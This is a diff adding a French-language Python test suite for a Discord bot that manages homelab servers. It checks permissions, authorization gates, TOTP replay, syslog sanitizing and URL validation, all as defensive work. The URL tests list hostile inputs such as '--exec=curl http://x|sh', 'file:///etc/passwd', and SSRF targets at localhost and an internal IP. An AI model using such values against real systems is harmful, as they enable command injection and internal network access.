@@ -1,0 +1,477 @@
+"""Tests de non-régression du bot Edmine (stdlib `unittest`, zéro dépendance ajoutée).
+
+    cd /opt/discord-bot && ./venv/bin/python -m unittest discover -s tests -v
+
+POURQUOI CES TESTS-LÀ. L'audit du 2026-08-11 a montré que le projet n'avait aucun test
+et que ses invariants critiques n'existaient qu'en prose dans les docstrings. On ne teste
+donc pas « du code au hasard » : chaque test ci-dessous ancre un invariant dont la
+violation a réellement coûté quelque chose, ou verrouille un correctif de cette campagne.
+
+Le test le plus important du fichier est `TestToutesLesVuesSontGardees` : il échoue dès
+qu'une NOUVELLE classe `discord.ui.View` est ajoutée sans passer par `GatedView`. C'est
+lui qui empêche la classe de défauts « bouton sans porte » de se reformer.
+"""
+import os
+import sys
+import time
+import unittest
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
+import discord  # noqa: E402
+
+from bot.core import format as fmt  # noqa: E402
+from bot.core.config import Config  # noqa: E402
+from bot.core.gates import GatedView, VALID_GATES  # noqa: E402
+
+
+# --------------------------------------------------------------------------- outils
+class FauxRole:
+    def __init__(self, rid):
+        self.id = rid
+
+
+class FauxGuild:
+    def __init__(self, owner_id=1):
+        self.owner_id = owner_id
+
+
+class FauxUser:
+    def __init__(self, uid, roles=()):
+        self.id = uid
+        self.roles = [FauxRole(r) for r in roles]
+
+
+class FauxInteraction:
+    """Le strict minimum que lisent permissions.is_admin / can_read / may_lock."""
+
+    def __init__(self, uid=42, roles=(), guild_id=100, owner_id=1):
+        self.user = FauxUser(uid, roles)
+        self.guild = FauxGuild(owner_id)
+        self.guild_id = guild_id
+
+
+# --------------------------------------------------------------------------- config
+class TestParsingConfig(unittest.TestCase):
+    """`GESTION_SERVERS` décide qui pilote quel serveur : un parsing laxiste ou trop
+    strict se traduit directement en droits accordés ou perdus."""
+
+    def _cfg(self, **env):
+        base = {"DISCORD_TOKEN": "x", "GUILD_ID": "100"}
+        base.update(env)
+        return Config(env=base)
+
+    def test_trois_tiers(self):
+        c = self._cfg(GESTION_SERVERS="R820:1:2:3")
+        self.assertEqual(c.gestion_servers["R820"],
+                         {"view": 1, "mod": 2, "owner": 3})
+
+    def test_retrocompat_deux_ids(self):
+        """Ancien format « clé:G:O » : le rôle de VUE ne doit JAMAIS donner Lock/nœud."""
+        c = self._cfg(GESTION_SERVERS="R820:7:9")
+        self.assertEqual(c.gestion_servers["R820"]["view"], 7)
+        self.assertEqual(c.gestion_servers["R820"]["mod"], 9)
+        self.assertEqual(c.gestion_servers["R820"]["owner"], 9)
+
+    def test_entree_mal_formee_ignoree(self):
+        """Une entrée cassée est REJETÉE, pas devinée — et n'emporte pas les autres."""
+        c = self._cfg(GESTION_SERVERS="R820:1:2:3,CASSE:abc:def,AVY-PVE:4:5:6")
+        self.assertIn("R820", c.gestion_servers)
+        self.assertIn("AVY-PVE", c.gestion_servers)
+        self.assertNotIn("CASSE", c.gestion_servers)
+
+    def test_plusieurs_serveurs(self):
+        c = self._cfg(GESTION_SERVERS="R820:1:2:3,AVY-PVE:4:5:6,SYNO:7:8:9")
+        self.assertEqual(len(c.gestion_servers), 3)
+
+    def test_node_server_key_retombe_sur_server_key(self):
+        """Correctif 2026-08-11 : le repli était « première entrée de GESTION_SERVERS »,
+        donc réordonner la variable changeait qui détient le shell root."""
+        c = self._cfg(GESTION_SERVERS="AVY-PVE:4:5:6,R820:1:2:3", SERVER_KEY="R820")
+        self.assertEqual(c.node_server_key, "R820")
+        self.assertEqual(c.node_mod_role_id, 2)
+
+    def test_csv_ints_tolere_espaces_et_vide(self):
+        c = self._cfg(ADMIN_IDS=" 12, 34 ,, 56 ")
+        self.assertEqual(c.admin_ids, [12, 34, 56])
+        self.assertEqual(self._cfg(ADMIN_IDS="").admin_ids, [])
+
+    def test_bool_formes_acceptees(self):
+        for v in ("1", "true", "TRUE", "yes", "on"):
+            self.assertTrue(self._cfg(TWOFA_ENABLED=v).twofa_enabled, v)
+        for v in ("0", "false", "no", "off", ""):
+            self.assertFalse(self._cfg(TWOFA_ENABLED=v).twofa_enabled, v)
+
+    def test_ct_channels(self):
+        c = self._cfg(CT_CHANNELS="jellyfin:123,web:456")
+        self.assertEqual(c.ct_channels, {"jellyfin": 123, "web": 456})
+
+
+# ---------------------------------------------------------------------- permissions
+class TestIsAdminFailClosed(unittest.TestCase):
+    """`is_admin(server=X)` retombait sur les rôles GLOBAUX quand X était inconnu :
+    un porteur de « Gestion R820 » pouvait piloter une machine d'Aveyron."""
+
+    def setUp(self):
+        from bot.core import permissions
+        self.perms = permissions
+        self.cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "100",
+                               "ADMIN_IDS": "999",
+                               "ADMIN_ROLE_IDS": "500",
+                               "GESTION_SERVERS": "R820:1:2:3,AVY-PVE:4:5:6"})
+
+    def test_cle_connue_borne_aux_roles_de_ce_serveur(self):
+        avy = FauxInteraction(uid=42, roles=(5,))       # M AVY-PVE
+        self.assertTrue(self.perms.is_admin(self.cfg, avy, server="AVY-PVE"))
+        r820 = FauxInteraction(uid=42, roles=(500,))    # Gestion R820 seulement
+        self.assertFalse(self.perms.is_admin(self.cfg, r820, server="AVY-PVE"))
+
+    def test_cle_INCONNUE_refuse(self):
+        """Le cœur du correctif : nœud ajouté/renommé, ou entrée mal formée."""
+        itx = FauxInteraction(uid=42, roles=(500,))     # Gestion R820
+        self.assertFalse(self.perms.is_admin(self.cfg, itx, server="AVY-INCONNU"))
+
+    def test_break_glass_survit_a_une_cle_inconnue(self):
+        """Fail-closed ne doit JAMAIS verrouiller totalement : propriétaire + ADMIN_IDS."""
+        proprio = FauxInteraction(uid=1, roles=(), owner_id=1)
+        self.assertTrue(self.perms.is_admin(self.cfg, proprio, server="AVY-INCONNU"))
+        admin = FauxInteraction(uid=999, roles=())
+        self.assertTrue(self.perms.is_admin(self.cfg, admin, server="AVY-INCONNU"))
+
+    def test_sans_serveur_utilise_les_roles_globaux(self):
+        itx = FauxInteraction(uid=42, roles=(500,))
+        self.assertTrue(self.perms.is_admin(self.cfg, itx))
+
+    def test_can_read_fail_closed_si_aucun_role_lecture(self):
+        cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "100"})
+        self.assertFalse(self.perms.can_read(cfg, FauxInteraction(uid=42, roles=(7,))))
+
+
+# ---------------------------------------------------------------------------- gates
+class TestToutesLesVuesSontGardees(unittest.TestCase):
+    """LE test anti-récidive de la campagne.
+
+    L'audit a trouvé 12 vues sans aucune porte d'autorisation, parce que la protection
+    reposait sur une convention. Ce test échoue dès qu'une `discord.ui.View` est ajoutée
+    sans hériter de `GatedView` : oublier la porte redevient impossible.
+
+    Si tu ajoutes une vue légitimement publique, hérite quand même de GatedView avec
+    `gate = None` ET un `gate_reason` écrit — l'exemption devient une décision tracée.
+    """
+
+    EXEMPTES = {
+        # vues internes de discord.py, hors de notre contrôle
+        "MissingPage",
+    }
+
+    def _charger_tous_les_modules(self):
+        import importlib
+        import pkgutil
+        import bot
+        for mod in pkgutil.walk_packages(bot.__path__, prefix="bot."):
+            try:
+                importlib.import_module(mod.name)
+            except Exception as e:  # noqa: BLE001
+                self.fail(f"{mod.name} ne s'importe pas : {type(e).__name__}: {e}")
+
+    def test_aucune_vue_sans_porte(self):
+        self._charger_tous_les_modules()
+        coupables = []
+        for cls in _sous_classes(discord.ui.View):
+            if cls is GatedView or issubclass(cls, GatedView):
+                continue
+            if cls.__name__ in self.EXEMPTES:
+                continue
+            if not cls.__module__.startswith("bot."):
+                continue        # vues internes de la bibliothèque
+            coupables.append(f"{cls.__module__}.{cls.__name__}")
+        self.assertEqual(
+            coupables, [],
+            "Ces vues n'héritent pas de GatedView, donc leurs boutons ne sont gardés "
+            "par RIEN (ni rôle, ni session 2FA) :\n  - " + "\n  - ".join(coupables))
+
+    def test_gate_declaree_valide_partout(self):
+        self._charger_tous_les_modules()
+        for cls in _sous_classes(GatedView):
+            # type.__new__ inscrit la classe dans __subclasses__ AVANT d'appeler
+            # __init_subclass__ : les classes fautives de nos propres tests y restent.
+            if not cls.__module__.startswith("bot."):
+                continue
+            self.assertIn(cls.gate, VALID_GATES,
+                          f"{cls.__module__}.{cls.__name__}: gate={cls.gate!r} invalide")
+            if cls.gate is None:
+                self.assertTrue(
+                    cls.gate_reason,
+                    f"{cls.__module__}.{cls.__name__} désactive la porte sans "
+                    "`gate_reason` : toute exemption doit être justifiée.")
+
+    def test_gate_inconnue_refusee_a_la_declaration(self):
+        with self.assertRaises(TypeError):
+            class VueFautive(GatedView):
+                gate = "administrateur"      # n'existe pas
+
+    def test_exemption_sans_justification_refusee(self):
+        with self.assertRaises(TypeError):
+            class VueNue(GatedView):
+                gate = None                  # sans gate_reason
+
+
+def _sous_classes(racine):
+    vues = set()
+    pile = [racine]
+    while pile:
+        c = pile.pop()
+        for s in c.__subclasses__():
+            if s not in vues:
+                vues.add(s)
+                pile.append(s)
+    return vues
+
+
+# ----------------------------------------------------------------------------- 2FA
+class TestAntiRejeuTOTP(unittest.TestCase):
+    """`valid_window=1` rend trois codes valides à la fois (~90 s). Ne mémoriser que le
+    DERNIER code laissait rejouer le précédent dès qu'un second était accepté."""
+
+    def setUp(self):
+        import tempfile
+        import pyotp
+        from bot.core.twofa import TwoFA
+        self.pyotp = pyotp
+        self.dir = tempfile.mkdtemp()
+        self.tf = TwoFA(os.path.join(self.dir, "2fa.json"), session_min=15)
+        self.secret, _ = self.tf.begin_enroll(7, "test")
+        self.totp = pyotp.TOTP(self.secret)
+        self.backup = self.tf.confirm_enroll(7, self.totp.now())
+        self.assertIsNotNone(self.backup, "inscription 2FA impossible")
+
+    def test_meme_code_refuse_deux_fois(self):
+        # `confirm_enroll` a déjà consommé le pas courant : on prend le SUIVANT.
+        code = self.totp.at(int(time.time()) + 30)
+        self.assertTrue(self.tf.verify(7, code))
+        self.assertFalse(self.tf.verify(7, code), "rejeu du MÊME code accepté")
+
+    def test_code_precedent_refuse_apres_avancee(self):
+        """Le vrai trou : A accepté, puis B accepté, puis A rejoué dans sa fenêtre."""
+        # valid_window=1 => seuls les pas N-1, N et N+1 sont acceptés. On repart d'une
+        # inscription faite sur N-1 pour garder N et N+1 disponibles.
+        import tempfile
+        from bot.core.twofa import TwoFA
+        tf = TwoFA(os.path.join(tempfile.mkdtemp(), "2fa.json"), session_min=15)
+        secret, _ = tf.begin_enroll(8, "test")
+        totp = self.pyotp.TOTP(secret)
+        maintenant = int(time.time())
+        self.assertIsNotNone(tf.confirm_enroll(8, totp.at(maintenant - 30)))  # pas N-1
+        code_a = totp.at(maintenant)                # pas N
+        code_b = totp.at(maintenant + 30)           # pas N+1
+        self.assertTrue(tf.verify(8, code_a))
+        self.assertTrue(tf.verify(8, code_b))
+        self.assertFalse(tf.verify(8, code_a),
+                         "le code de la fenêtre précédente est encore rejouable")
+
+    def test_code_de_secours_a_usage_unique(self):
+        b = self.backup[0]
+        self.assertTrue(self.tf.verify(7, b))
+        self.assertFalse(self.tf.verify(7, b), "code de secours réutilisable")
+
+    def test_session_ouverte_puis_fermee(self):
+        self.assertTrue(self.tf.verify(7, self.totp.at(int(time.time()) + 30)))
+        self.assertTrue(self.tf.trusted(7))
+        self.tf.close_session(7)
+        self.assertFalse(self.tf.trusted(7))
+
+    def test_magasin_illisible_marque_degrade(self):
+        """`degraded` gèle la réconciliation des rôles : sans lui, un fichier corrompu
+        ferait conclure « personne n'est inscrit » et révoquerait Gestion/O à tous."""
+        from bot.core.twofa import TwoFA
+        p = os.path.join(self.dir, "casse.json")
+        with open(p, "w") as f:
+            f.write("{ceci n'est pas du json")
+        self.assertTrue(TwoFA(p, session_min=15).degraded)
+
+    def test_fichier_absent_nest_PAS_degrade(self):
+        from bot.core.twofa import TwoFA
+        tf = TwoFA(os.path.join(self.dir, "jamais-cree.json"), session_min=15)
+        self.assertFalse(tf.degraded, "aucun inscrit = état normal, pas dégradé")
+
+
+# -------------------------------------------------------------------------- syslog
+class TestParsingSyslog(unittest.TestCase):
+    """Le listener UDP accepte des paquets NON AUTHENTIFIÉS et les republie dans Discord :
+    tout ce qui en sort doit être délinéarisé et borné."""
+
+    def setUp(self):
+        from bot.core import syslog_lib
+        self.sl = syslog_lib
+
+    def test_rfc3164(self):
+        sev, host, app, txt = self.sl.parse_packet(
+            b"<11>Aug 11 00:12:01 pve kernel: quelque chose", "10.3.10.200")
+        self.assertEqual(sev, 3)
+        self.assertEqual(host, "pve")
+        self.assertIn("quelque chose", txt)
+
+    def test_rfc5424(self):
+        sev, host, app, txt = self.sl.parse_packet(
+            b"<14>1 2026-08-11T00:12:01Z jellyfin sshd 1234 - - session ouverte",
+            "10.3.10.105")
+        self.assertEqual(sev, 6)
+        self.assertEqual(host, "jellyfin")
+        self.assertEqual(app, "sshd")
+
+    def test_hostname_borne(self):
+        long = "h" * 500
+        _, host, _, _ = self.sl.parse_packet(
+            f"<11>Aug 11 00:12:01 {long} app: x".encode(), "10.0.0.1")
+        self.assertLessEqual(len(host), self.sl.MAX_HOST)
+
+    def test_forge_de_lignes_impossible(self):
+        """Un émetteur hostile ne doit pas pouvoir injecter des lignes Discord —
+        ni par le corps, ni par le hostname, ni par le nom de programme."""
+        forge = b"<11>1 2026-08-11T00:00:00Z ho\nst ap\np 1 - - corps\nligne2"
+        sev, host, app, txt = self.sl.parse_packet(forge, "10.0.0.1")
+        # 1) à la source : l'hôte et le programme ne portent plus de saut de ligne
+        for champ, nom in ((host, "host"), (app, "app")):
+            self.assertNotIn("\n", champ, f"saut de ligne conservé dans {nom}")
+            self.assertNotIn("\r", champ, f"retour chariot conservé dans {nom}")
+        # 2) au rendu : le corps garde ses sauts de ligne légitimes (une trace d'exception
+        #    EST multi-ligne), c'est sanitize_field/sanitize_code qui protège l'en-tête
+        self.assertNotIn("\n", self.sl.sanitize_field(host, self.sl.MAX_HOST))
+        self.assertNotIn("\n", self.sl.sanitize_code(app, self.sl.MAX_APP))
+
+    def test_paquet_vide_ne_leve_pas(self):
+        self.assertIsNotNone(self.sl.parse_packet(b"", "10.0.0.1"))
+
+    def test_agregateur_borne(self):
+        """Sans plafond, un flux UDP soutenu épuise la RAM du conteneur."""
+        agg = self.sl.Aggregator()
+        maxi = getattr(self.sl, "MAX_GROUPS", 2000)
+        for i in range(maxi + 200):
+            agg.add(3, f"hote{i}", "app", f"message {i}")
+        self.assertLessEqual(len(agg.groups), maxi)
+
+
+# --------------------------------------------------------------------------- noms
+class TestNomsDeSalons(unittest.TestCase):
+    """`slug` et `strip_status_emoji` doivent être exactement réciproques : c'est ce qui
+    évite qu'un salon soit recréé en double ou renommé en boucle."""
+
+    def test_slug_stable(self):
+        self.assertEqual(fmt.slug("Mon CT"), fmt.slug("Mon CT"))
+        self.assertNotIn(" ", fmt.slug("mon ct"))
+
+    def test_strip_status_emoji_reciproque(self):
+        for base in ("jellyfin", "web-test", "authentik-avy"):
+            for emoji in ("🟢", "🔴", "🟠"):
+                self.assertEqual(fmt.strip_status_emoji(f"{emoji}-{base}"), base,
+                                 f"{emoji}-{base}")
+
+    def test_strip_sans_emoji_inchange(self):
+        self.assertEqual(fmt.strip_status_emoji("jellyfin"), "jellyfin")
+
+    def test_slug_idempotent(self):
+        s = fmt.slug("Éléonore & Cie")
+        self.assertEqual(fmt.slug(s), s, "slug non idempotent : renommages en boucle")
+
+
+# ------------------------------------------------------------------------ youtube
+class TestValidationURL(unittest.TestCase):
+    """L'URL de `/yt` part vers yt-dlp sur le CT120, et `/yt` n'exige que le rôle de
+    LECTURE. La validation d'entrée est de notre côté."""
+
+    def setUp(self):
+        from bot.cogs import youtube
+        self.yt = youtube
+
+    def test_urls_legitimes(self):
+        for u in ("https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+                  "https://youtu.be/dQw4w9WgXcQ",
+                  "https://www.twitch.tv/videos/123456"):
+            self.assertTrue(self.yt._valid_url(u), u)
+
+    def test_schemas_refuses(self):
+        for u in ("file:///etc/passwd", "ftp://x/y", "javascript:alert(1)",
+                  "--exec=curl http://x|sh", "/etc/passwd"):
+            self.assertFalse(self.yt._valid_url(u), u)
+
+    def test_ssrf_interne_refuse(self):
+        for u in ("http://10.3.10.200:8006/", "http://localhost/", "http://127.0.0.1/"):
+            self.assertFalse(self.yt._valid_url(u), u)
+
+    def test_domaine_ressemblant_refuse(self):
+        """« youtube.com.pirate.tld » ne doit pas passer pour youtube.com."""
+        for u in ("https://youtube.com.pirate.tld/x", "https://notyoutube.com/x",
+                  "https://evil.tld/?x=youtube.com"):
+            self.assertFalse(self.yt._valid_url(u), u)
+
+    def test_sous_domaine_legitime_accepte(self):
+        self.assertTrue(self.yt._valid_url("https://m.youtube.com/watch?v=abc"))
+
+    def test_non_chaine(self):
+        for u in (None, 123, [], {}):
+            self.assertFalse(self.yt._valid_url(u))
+
+    def test_intention_playlist(self):
+        self.assertTrue(self.yt._playlist_intent(
+            "https://www.youtube.com/playlist?list=PLabc"))
+        self.assertTrue(self.yt._playlist_intent(
+            "https://www.youtube.com/watch?v=x&list=PLabc"))
+        self.assertFalse(self.yt._playlist_intent(
+            "https://www.youtube.com/watch?v=x"))
+        self.assertFalse(self.yt._playlist_intent("https://www.twitch.tv/videos/1"))
+
+
+# --------------------------------------------------------------------------- influx
+class TestInfluxEchecDifferentDeVide(unittest.TestCase):
+    """Une requête en échec renvoyait `[]`, exactement comme « aucune donnée » :
+    les alertes devenaient aveugles sans que rien ne le dise."""
+
+    def test_expose_son_etat(self):
+        from bot.core.influx import Influx
+        cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "1"})
+        inf = Influx(cfg)                      # sans jeton : désactivé
+        self.assertTrue(hasattr(inf, "last_error"))
+        self.assertIsNone(inf.last_error, "aucune requête tentée = aucune erreur")
+
+
+# ------------------------------------------------------------ tâches de fond (bg)
+class TestFiletDesBoucles(unittest.TestCase):
+    """Une exception non rattrapée arrête une `tasks.loop` DÉFINITIVEMENT. Le filet doit
+    exister, et `/health` doit pouvoir dire qu'une boucle est morte."""
+
+    def test_registre_et_resume(self):
+        from bot.core import bg
+        saines, total, cassees = bg.loops_summary()
+        self.assertIsInstance(total, int)
+        self.assertIsInstance(cassees, list)
+        self.assertEqual(saines, total - len(cassees))
+
+    def test_guard_cog_loops_est_idempotent(self):
+        from discord.ext import commands, tasks
+        from bot.core import bg
+
+        class FauxCog(commands.Cog):
+            @tasks.loop(seconds=3600)
+            async def ma_boucle(self):
+                pass
+
+        cog = FauxCog()
+        n1 = bg.guard_cog_loops(cog)
+        n2 = bg.guard_cog_loops(cog)
+        self.assertEqual(n1, n2, "les mêmes boucles doivent être retrouvées")
+        self.assertTrue(any("ma_boucle" in n for n in n1),
+                        "la boucle du cog n'a pas été détectée")
+
+    def test_backoff_ne_relance_pas_en_boucle_serree(self):
+        """`restart()` est un no-op sur une tâche terminée : le module doit utiliser
+        `start()`, et espacer les relances au lieu de marteler."""
+        import inspect
+        from bot.core import bg
+        src = inspect.getsource(bg)
+        self.assertIn("start()", src)
+        self.assertNotIn("loop.restart()", src,
+                         "restart() est un no-op après échec — utiliser start()")
+
+
+if __name__ == "__main__":
+    unittest.main(verbosity=2)
